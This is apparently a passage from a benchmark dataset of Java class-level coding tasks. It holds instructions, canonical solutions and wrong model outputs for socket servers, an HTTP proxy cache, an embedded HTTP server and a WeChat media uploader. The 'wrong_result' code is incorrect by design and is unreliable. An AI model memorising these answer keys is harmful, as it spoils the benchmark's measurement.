    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Set;\n\npublic class LinkServer {\n    private ServerSocket server;\n    private int port = 9999;\n\n    final int UPDATE_CONTENT = 1;\n    final int UPDATE_PROGRESS = 2;\n    final int GET_CURRENT_CONTENT = 3;\n    final int SET_DRAW_DEBUG = 4;\n    final int GET_LAYOUT_LIST = 5;\n    final int GET_CURRENT_LAYOUT = 6;\n    final int UPDATE_LAYOUT_DIMENSIONS = 7;\n\n    public LinkServer() {\n        init();\n        start();\n    }\n\n    public LinkServer(int port) {\n        this.port = port;\n        init();\n        start();\n    }\n\n    private void init() {\n        try {\n            server = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void start() {\n        Thread t = new Thread(() -> {\n            try {\n                while (true) {\n                    Socket client = server.accept();\n                    Thread acceptThread = new Thread(() -> handleRequest(client));\n                    acceptThread.start();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        t.setName(\"Link Debug Thread\");\n        t.start();\n    }\n\n    void handleRequest(Socket socket) {\n        boolean running = true;\n        DataInputStream reader;\n        DataOutputStream writer;\n        try {\n            reader = new DataInputStream(socket.getInputStream());\n            writer = new DataOutputStream(socket.getOutputStream());\n        } catch (IOException e) {\n            e.printStackTrace();\n            return;\n        }\n\n        while (running) {\n            try {\n                int type = reader.readInt();\n                String name = reader.readUTF();\n                switch (type) {\n                    case UPDATE_CONTENT:\n                        String content = reader.readUTF();\n                        break;\n                    case UPDATE_PROGRESS:\n                        float progress = reader.readFloat();\n                        break;\n                    case GET_CURRENT_CONTENT:\n                        content = \"\";\n                        writer.writeUTF(content);\n                        break;\n                    case SET_DRAW_DEBUG:\n                        boolean drawDebug = reader.readBoolean();\n                        break;\n                    case GET_LAYOUT_LIST:\n                        Set<String> list = Set.of();\n                        writer.writeInt(list.size());\n                        for (String layout : list) {\n                            writer.writeUTF(layout);\n                        }\n                        break;\n                    case GET_CURRENT_LAYOUT:\n                        content = \"\";\n                        writer.writeUTF(content);\n                        break;\n                    case UPDATE_LAYOUT_DIMENSIONS:\n                        int width = reader.readInt();\n                        int height = reader.readInt();\n                        break;\n                }\n            } catch (Exception e) {\n                closeConnection(socket);\n                running = false;\n            }\n        }\n    }\n\n    private void closeConnection(Socket socket) {\n        try {\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class LinkServer {\n    private ServerSocket server;\n    private int port = 9999;\n    public static final int UPDATE_CONTENT = 1;\n    public static final int UPDATE_PROGRESS = 2;\n    public static final int GET_CURRENT_CONTENT = 3;\n    public static final int SET_DRAW_DEBUG = 4;\n    public static final int GET_LAYOUT_LIST = 5;\n    public static final int GET_CURRENT_LAYOUT = 6;\n    public static final int UPDATE_LAYOUT_DIMENSIONS = 7;\n\n    public LinkServer() {\n        this.port = 9999;\n        init();\n    }\n\n    public LinkServer(int port) {\n        this.port = port;\n        init();\n    }\n\n    private void init() {\n        try {\n            server = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        new Thread(() -> {\n            while (true) {\n                try {\n                    Socket socket = server.accept();\n                    new Thread(this::handleRequest).start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }).start();\n    }\n\n    private void handleRequest(Socket socket) {\n        try {\n            ObjectInputStream input = new ObjectInputStream(socket.getInputStream());\n            ObjectOutputStream output = new ObjectOutputStream(socket.getOutputStream());\n            int opCode = input.readInt();\n            switch (opCode) {\n                case UPDATE_CONTENT:\n                    // Handle content update\n                    break;\n                case UPDATE_PROGRESS:\n                    // Handle progress update\n                    break;\n                case GET_CURRENT_CONTENT:\n                    // Retrieve current content\n                    break;\n                case SET_DRAW_DEBUG:\n                    // Set debug mode\n                    break;\n                case GET_LAYOUT_LIST:\n                    // Retrieve layout list\n                    break;\n                case GET_CURRENT_LAYOUT:\n                    // Retrieve current layout\n                    break;\n                case UPDATE_LAYOUT_DIMENSIONS:\n                    // Update layout dimensions\n                    break;\n                default:\n                    // Unknown operation\n                    break;\n            }\n            output.writeInt(200); // Success\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            closeConnection(socket);\n        }\n    }\n\n    private void closeConnection(Socket socket) {\n        if (socket != null) {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 556,
    "Instruction": "Task Description: Implement a TCP server class in Java that handles multiple client connections concurrently using thread pooling. The server should listen on a specified port, accept incoming connections, and process client requests in separate worker threads.\n\nClass Description: ViewServer is a TCP server implementation that manages incoming client connections using a thread pool. It provides methods to start and stop the server, and processes client requests asynchronously through worker threads.\n\nAttributes:\n- VIEW_SERVER_DEFAULT_PORT: int - Default port number for the server (4939)\n- VIEW_SERVER_MAX_CONNECTIONS: int - Maximum number of concurrent connections (10)\n- mServer: ServerSocket - The server socket instance for accepting connections\n- mPort: int - The port number on which the server listens\n- mThread: Thread - The server's main thread\n- mThreadPool: ExecutorService - Thread pool for handling client connections\n\nMethods:\n- ViewServer(int port) -> None - Constructor that initializes the server with specified port\n- start() -> boolean - Starts the server thread and initializes thread pool, returns true if successful\n- stop() -> boolean - Stops the server thread, shuts down thread pool, and closes server socket, returns true if successful\n- run() -> None - Main server loop that accepts incoming connections and delegates to worker threads\n- ViewServerWorker(Socket client) -> None - Nested class constructor for handling individual client connections\n- run() (in ViewServerWorker) -> None - Processes client request by reading input stream and closing connection",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    \n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n        return true;\n    }\n\n    public boolean stop() {\n        if (mThread != null) {\n            mThread.interrupt();\n            if (mThreadPool != null) {\n                try {\n                    mThreadPool.shutdownNow();\n                } catch (SecurityException e) {\n                    // Ignore\n                }\n            }\n\n            mThreadPool = null;\n            mThread = null;\n\n            try {\n                mServer.close();\n                mServer = null;\n                return true;\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n        return false;\n    }\n\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            // Ignore\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n            } catch (Exception e) {\n                // Ignore\n            }\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        public ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                String request = in.readLine();\n                // Process client request here\n            } catch(IOException e) {\n                // Ignore\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class ViewServer {\n    public static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    public static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    public ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() {\n        try {\n            mServer = new ServerSocket(mPort);\n            mThreadPool = new ThreadPoolExecutor(\n                VIEW_SERVER_MAX_CONNECTIONS,\n                VIEW_SERVER_MAX_CONNECTIONS,\n                0L,\n                TimeUnit.MILLISECONDS,\n                new LinkedBlockingQueue<Runnable>()\n            );\n            mThread = new Thread(this);\n            mThread.start();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    public boolean stop() {\n        try {\n            if (mServer != null) {\n                mServer.close();\n            }\n            if (mThreadPool != null) {\n                mThreadPool.shutdown();\n            }\n            if (mThread != null) {\n                mThread.interrupt();\n            }\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public void run() {\n        try {\n            while (true) {\n                Socket client = mServer.accept();\n                mThreadPool.execute(new ViewServerWorker(client));\n            }\n        } catch (IOException e) {\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private final Socket client;\n\n        public ViewServerWorker(Socket client) {\n            this.client = client;\n        }\n\n        @Override\n        public void run() {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(\"Received: \" + line);\n                }\n            } catch (IOException e) {\n            } finally {\n                try {\n                    client.close();\n                } catch (IOException e) {\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 557,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP proxy cache server using ServerSocket for handling client connections and requests.\n\nClass Description: The HttpProxyCacheServer class acts as a local proxy server that listens for incoming client connections, processes HTTP GET requests, and can respond to ping requests. It manages client connections using a thread pool for concurrent request handling.\n\nAttributes:\n- serverSocket: [ServerSocket] - The main server socket that listens for incoming client connections\n- port: [int] - The port number on which the server is listening\n- waitConnectionThread: [Thread] - Thread that waits for incoming client connections\n- socketProcessor: [ExecutorService] - Thread pool for processing client sockets concurrently\n- pinger: [Pinger] - Helper class for handling ping requests\n\nMethods:\n- HttpProxyCacheServer([Context context]) -> [void] - Constructor that initializes the server socket and starts the connection waiting thread\n- waitForRequest() -> [void] - Continuously accepts incoming client connections and submits them to the thread pool\n- processSocket([Socket socket]) -> [void] - Processes an individual client socket connection and handles the request\n- releaseSocket([Socket socket]) -> [void] - Properly closes and releases socket resources\n- WaitRequestsRunnable([CountDownLatch startSignal]) -> [void] - Runnable implementation that starts the connection waiting process\n- SocketProcessorRunnable([Socket socket]) -> [void] - Runnable implementation that processes an individual client socket",
    "Canonical_solution": "import android.content.Context;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class HttpProxyCacheServer {\n\n    private static final String PROXY_HOST = \"127.0.0.1\";\n\n    private final ServerSocket serverSocket;\n    private final int port;\n    private final Thread waitConnectionThread;\n    private final ExecutorService socketProcessor = Executors.newFixedThreadPool(8);\n    private final Pinger pinger;\n\n    public HttpProxyCacheServer(Context context) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(PROXY_HOST);\n            this.serverSocket = new ServerSocket(0, 8, inetAddress);\n            this.port = serverSocket.getLocalPort();\n            CountDownLatch startSignal = new CountDownLatch(1);\n            this.waitConnectionThread = new Thread(new WaitRequestsRunnable(startSignal));\n            this.waitConnectionThread.start();\n            startSignal.await();\n            this.pinger = new Pinger(PROXY_HOST, port);\n        } catch (IOException | InterruptedException e) {\n            socketProcessor.shutdown();\n            throw new IllegalStateException(\"Error starting local proxy server\", e);\n        }\n    }\n\n    private void waitForRequest() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            }\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            GetRequest request = GetRequest.read(socket.getInputStream());\n            String url = ProxyCacheUtils.decode(request.uri);\n            if (pinger.isPingRequest(url)) {\n                pinger.responseToPing(socket);\n            } else {\n                // Process client request\n            }\n        } catch (SocketException e) {\n            // Client closed connection\n        } catch (IOException e) {\n            // Handle error\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        try {\n            if (!socket.isInputShutdown()) {\n                socket.shutdownInput();\n            }\n            if (!socket.isOutputShutdown()) {\n                socket.shutdownOutput();\n            }\n            if (!socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    private final class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            waitForRequest();\n        }\n    }\n\n    private final class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class HttpProxyCacheServer {\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread waitConnectionThread;\n    private ExecutorService socketProcessor;\n    private Pinger pinger;\n\n    public HttpProxyCacheServer(Context context) {\n        this.port = context.getPort();\n        serverSocket = new ServerSocket(port);\n        socketProcessor = Executors.newFixedThreadPool(10);\n        CountDownLatch startSignal = new CountDownLatch(1);\n        waitConnectionThread = new Thread(new WaitRequestsRunnable(startSignal));\n        startSignal.countDown();\n        waitConnectionThread.start();\n    }\n\n    private void waitForRequest() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String firstLine = in.readLine();\n            if (firstLine.startsWith(\"GET\")) {\n                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n                out.println(\"HTTP/1.1 200 OK\");\n                out.println(\"Content-Type: text/plain\");\n                out.println(\"Content-Length: 0\");\n                out.flush();\n            } else if (firstLine.startsWith(\"PING\")) {\n                pinger.handlePing(socket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class WaitRequestsRunnable implements Runnable {\n        private CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            try {\n                startSignal.await();\n                waitForRequest();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class SocketProcessorRunnable implements Runnable {\n        private Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}"
  },
  {
    "Task_id": 558,
    "Instruction": "Task Description: Implement a simple embedded HTTP server in Java that can handle incoming HTTP requests, parse request headers, and delegate request handling to a customizable method.\n\nClass Description: The EmbedHttpServer class represents a basic HTTP server that listens on a specified port, accepts client connections, parses HTTP requests, and provides hooks for custom request handling.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- serverSocket: ServerSocket - The server socket used to accept client connections\n\nMethods:\n- EmbedHttpServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> void - Starts the server by creating a ServerSocket and launching a new thread to handle connections\n- stop() -> void - Stops the server by closing the ServerSocket and cleaning up resources\n- handle(String method, String path, HashMap<String, String> headers, InputStream input, OutputStream response) -> void - Abstract method to be implemented for custom request handling (takes HTTP method, path, headers, request body stream, and response stream)\n- run() -> void - Main server loop that accepts connections, parses requests, and delegates to handle() method (implements Runnable interface)\n- BodyInputStream(InputStream ins, int n) -> None - Nested class constructor that creates an input stream with limited bytes to read\n- available() -> int - Returns the number of bytes available in the BodyInputStream\n- read() -> int - Reads a single byte from the BodyInputStream\n- read(byte[] b, int off, int len) -> int - Reads bytes into an array from the BodyInputStream\n- skip(long n) -> long - Throws IOException as skipping is not supported\n- close() -> void - Closes the underlying input stream",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\n\npublic class EmbedHttpServer implements Runnable {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        if (serverSocket == null) {\n            serverSocket = new ServerSocket(port);\n            new Thread(this, \"embed-http-server\").start();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n            serverSocket = null;\n        }\n    }\n\n    protected void handle(String method, String path,\n            HashMap<String, String> headers, InputStream input,\n            OutputStream response) throws Exception {\n    }\n\n    @Override\n    public void run() {\n        final ServerSocket ss = serverSocket;\n        while (ss == serverSocket) {\n            Socket conn = null;\n            try {\n                conn = ss.accept();\n                String method = null;\n                String path = null;\n                HashMap<String, String> headers = new HashMap<String, String>();\n\n                InputStream ins = conn.getInputStream();\n                StringBuilder sb = new StringBuilder(512);\n                int l;\n                while ((l = ins.read()) != -1) {\n                    if (l == '\\n') {\n                        if (sb.length() > 0\n                                && sb.charAt(sb.length() - 1) == '\\r')\n                            sb.setLength(sb.length() - 1);\n                        if (sb.length() == 0) {\n                            break;\n                        } else if (method == null) {\n                            int i = sb.indexOf(\" \");\n                            method = sb.substring(0, i);\n                            int j = sb.lastIndexOf(\" HTTP/\");\n                            path = sb.substring(i + 1, j).trim();\n                        } else {\n                            int i = sb.indexOf(\":\");\n                            String name = sb.substring(0, i).trim();\n                            String val = sb.substring(i + 1).trim();\n                            headers.put(name, val);\n                        }\n                        sb.setLength(0);\n                    } else {\n                        sb.append((char) l);\n                    }\n                }\n                int contentLength = 0;\n                String str = headers.get(\"Content-Length\");\n                if (str != null) {\n                    contentLength = Integer.parseInt(str);\n                }\n                OutputStream os = conn.getOutputStream();\n                str = headers.get(\"Expect\");\n                if (\"100-Continue\".equalsIgnoreCase(str)) {\n                    os.write(\"HTTP/1.1 100 Continue\\r\\n\\r\\n\".getBytes(\"ASCII\"));\n                    os.flush();\n                }\n                InputStream input = new BodyInputStream(ins, contentLength);\n                handle(method, path, headers, input, os);\n                os.close();\n\n                conn.close();\n                conn = null;\n            } catch (Exception e) {\n                if (conn != null) {\n                    try {\n                        conn.close();\n                    } catch (Exception ee) {\n                    }\n                }\n            }\n\n            if (!ss.isBound() || ss.isClosed()) {\n                serverSocket = null;\n            }\n        }\n    }\n\n    private static class BodyInputStream extends InputStream {\n        private InputStream ins;\n        private int n;\n\n        public BodyInputStream(InputStream ins, int n) {\n            this.ins = ins;\n            this.n = n;\n        }\n\n        @Override\n        public int available() throws IOException {\n            return n;\n        }\n\n        @Override\n        public int read() throws IOException {\n            if (n <= 0)\n                return -1;\n            int r = ins.read();\n            if (r != -1)\n                n--;\n            return r;\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws IOException {\n            if (n <= 0)\n                return -1;\n            int l = ins.read(b, off, len < n ? len : n);\n            if (l != -1)\n                n -= l;\n            return l;\n        }\n\n        @Override\n        public long skip(long n) throws IOException {\n            throw new IOException(\"unsupported\");\n        }\n\n        @Override\n        public void close() throws IOException {\n            ins.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class EmbedHttpServer {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            new Thread(this::run).start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void handle(String method, String path, java.util.HashMap<String, String> headers, java.io.InputStream input, java.io.OutputStream response) {\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                java.net.Socket client = serverSocket.accept();\n                java.io.InputStream ins = client.getInputStream();\n                java.io.OutputStream outs = client.getOutputStream();\n\n                String requestLine = readRequestLine(ins);\n                String[] parts = requestLine.split(\"\\\\s+\");\n                String method = parts[0];\n                String path = parts[1];\n                String protocol = parts[2];\n\n                java.util.HashMap<String, String> headers = new java.util.HashMap<>();\n                String line;\n                while ((line = readNextLine(ins)) != null && !line.trim().isEmpty()) {\n                    String[] headerParts = line.split(\"\\\\s+\");\n                    String headerName = headerParts[0].toLowerCase();\n                    String headerValue = java.util.Arrays.stream(headerParts).skip(1).collect(java.util.Collectors.joining(\" \"));\n                    headers.put(headerName, headerValue);\n                }\n\n                BodyInputStream bodyIns = new BodyInputStream(ins, 1024 * 1024);\n                handle(method, path, headers, bodyIns, outs);\n\n                client.close();\n            } catch (java.io.IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String readRequestLine(java.io.InputStream ins) throws java.io.IOException {\n        java.lang.StringBuilder sb = new java.lang.StringBuilder();\n        int b;\n        while ((b = ins.read()) != -1) {\n            if (b == '\\r' || b == '\\n') {\n                break;\n            }\n            sb.append((char) b);\n        }\n        return sb.toString();\n    }\n\n    private String readNextLine(java.io.InputStream ins) throws java.io.IOException {\n        java.lang.StringBuilder sb = new java.lang.StringBuilder();\n        int b;\n        while ((b = ins.read()) != -1) {\n            if (b == '\\r' || b == '\\n') {\n                break;\n            }\n            sb.append((char) b);\n        }\n        return sb.toString();\n    }\n\n    private class BodyInputStream extends java.io.InputStream {\n        private final java.io.InputStream in;\n        private final int limit;\n        private int bytesRead = 0;\n\n        public BodyInputStream(java.io.InputStream ins, int n) {\n            this.in = ins;\n            this.limit = n;\n        }\n\n        @Override\n        public int available() throws java.io.IOException {\n            return Math.min(limit - bytesRead, in.available());\n        }\n\n        @Override\n        public int read() throws java.io.IOException {\n            if (bytesRead >= limit) {\n                return -1;\n            }\n            int b = in.read();\n            if (b != -1) {\n                bytesRead++;\n            }\n            return b;\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws java.io.IOException {\n            if (bytesRead >= limit) {\n                return -1;\n            }\n            int bytesToRead = Math.min(len, limit - bytesRead);\n            int bytesReadFromStream = in.read(b, off, bytesToRead);\n            if (bytesReadFromStream != -1) {\n                bytesRead += bytesReadFromStream;\n            }\n            return bytesReadFromStream;\n        }\n\n        @Override\n        public long skip(long n) throws java.io.IOException {\n            throw new java.io.IOException(\"Skipping not supported\");\n        }\n\n        @Override\n        public void close() throws java.io.IOException {\n            in.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 56,
    "Instruction": "Task Description: Implement a utility class for handling media uploads to the WeChat API, including processing file types and managing HTTP connections for file transfer.\n\nClass Description: WechatMediaUtil is a Spring component that provides functionality to upload media files to WeChat's servers through their API. It handles authentication, file type validation, and multipart form data submission.\n\nAttributes:\n- wechatAccessTokenUtil: [WechatAccessTokenUtil] - Autowired dependency for managing WeChat access tokens\n- MEDIA_URL: [String] - Constant URL template for WeChat media upload API (contains ACCESS_TOKEN and TYPE placeholders)\n\nMethods:\n- uploadMedia: [uploadMedia](String type, String mediaFileUrl) -> String - Uploads a media file to WeChat servers. Takes media type and file URL as input, returns WeChat media ID. Handles token refresh on expiration and error cases.\n- judgeType: [judgeType](String contentType) -> String - Determines file extension from content type. Throws exception for unsupported types. Used internally by uploadMedia.\n\nInput for uploadMedia:\n- type: [String] - Media type (e.g., \"image\")\n- mediaFileUrl: [String] - URL of the media file to upload\n\nOutput for uploadMedia:\n- [String] - WeChat media ID of the uploaded file\n\nInput for judgeType:\n- contentType: [String] - MIME type of the file\n\nOutput for judgeType:\n- [String] - Corresponding file extension (e.g., \".jpg\")",
    "Canonical_solution": "import cn.hutool.json.JSONObject;\nimport cn.lili.common.enums.ClientTypeEnum;\nimport cn.lili.common.enums.ResultCode;\nimport cn.lili.common.exception.ServiceException;\nimport cn.lili.modules.wechat.util.WechatAccessTokenUtil;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\n@Slf4j\n@Component\npublic class WechatMediaUtil {\n    @Autowired\n    private WechatAccessTokenUtil wechatAccessTokenUtil;\n\n    public String uploadMedia(String type, String mediaFileUrl) {\n        String accessToken = wechatAccessTokenUtil.cgiAccessToken(ClientTypeEnum.WECHAT_MP);\n        String MEDIA_URL = \"https://api.weixin.qq.com/cgi-bin/media/upload?access_token=ACCESS_TOKEN&type=TYPE\";\n\n        StringBuffer resultStr = null;\n        String mediaStr = MEDIA_URL.replace(\"ACCESS_TOKEN\", accessToken).replace(\"TYPE\", type);\n        URL mediaUrl;\n        try {\n            String boundary = \"----WebKitFormBoundaryOYXo8heIv9pgpGjT\";\n            URL url = new URL(mediaStr);\n            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();\n            urlConn.setDoInput(true);\n            urlConn.setDoOutput(true);\n            urlConn.setUseCaches(false);\n            urlConn.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n            urlConn.setRequestMethod(\"POST\");\n            OutputStream out = urlConn.getOutputStream();\n\n            mediaUrl = new URL(mediaFileUrl);\n            HttpURLConnection mediaConn = (HttpURLConnection) mediaUrl.openConnection();\n            mediaConn.setRequestMethod(\"GET\");\n            mediaConn.setDoInput(true);\n            String contentType = mediaConn.getHeaderField(\"Content-Type\");\n            String fileExt = judgeType(contentType);\n            InputStream in = mediaConn.getInputStream();\n            BufferedInputStream bufferedIn = new BufferedInputStream(in);\n            byte[] bytes = new byte[1024];\n            int size = 0;\n            out.write((\"--\" + boundary + \"\\r\\n\").getBytes());\n            out.write((\"Content-Disposition: form-data; name=\\\"media\\\";\\r\\n\"\n                    + \"filename=\\\"\" + (System.currentTimeMillis()) + fileExt + \"\\\"\\r\\n\"\n                    + \"Content-Type: \" + contentType + \"\\r\\n\\r\\n\").getBytes());\n            while ((size = bufferedIn.read(bytes)) != -1) {\n                out.write(bytes, 0, size);\n            }\n            out.write((\"\\r\\n--\" + boundary + \"--\\r\\n\").getBytes());\n\n            bufferedIn.close();\n            in.close();\n            mediaConn.disconnect();\n\n            InputStream resultIn = urlConn.getInputStream();\n            InputStreamReader reader = new InputStreamReader(resultIn);\n            BufferedReader bufferedReader = new BufferedReader(reader);\n            String tempStr = null;\n            resultStr = new StringBuffer();\n            while ((tempStr = bufferedReader.readLine()) != null) {\n                resultStr.append(tempStr);\n            }\n            bufferedReader.close();\n            reader.close();\n            resultIn.close();\n            urlConn.disconnect();\n        } catch (Exception e) {\n            log.error(\"\u5fae\u4fe1\u5a92\u4f53\u4e0a\u4f20\u5931\u8d25\", e);\n        }\n        assert resultStr != null;\n        JSONObject jsonObject = new JSONObject(resultStr.toString());\n        log.info(\"\u5fae\u4fe1\u5a92\u4f53\u4e0a\u4f20:\" + jsonObject);\n        if (jsonObject.get(\"errcode\") != null && (\"40001\").equals(jsonObject.get(\"errcode\"))) {\n            wechatAccessTokenUtil.removeAccessToken(ClientTypeEnum.WECHAT_MP);\n            return this.uploadMedia(type, mediaFileUrl);\n        } else if (jsonObject.get(\"errcode\") != null) {\n            throw new ServiceException(jsonObject.get(\"errmsg\").toString());\n        } else {\n            return jsonObject.get(\"media_id\").toString();\n        }\n    }\n\n    public String judgeType(String contentType) {\n        String fileExt = \"\";\n        switch (contentType) {\n            case \"image/png\":\n                fileExt = \".png\";\n                break;\n            case \"image/jpeg\":\n                fileExt = \".jpeg\";\n                break;\n            case \"image/jpg\":\n                fileExt = \".jpg\";\n                break;\n            default:\n                throw new ServiceException(ResultCode.IMAGE_FILE_EXT_ERROR);\n        }\n        return fileExt;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
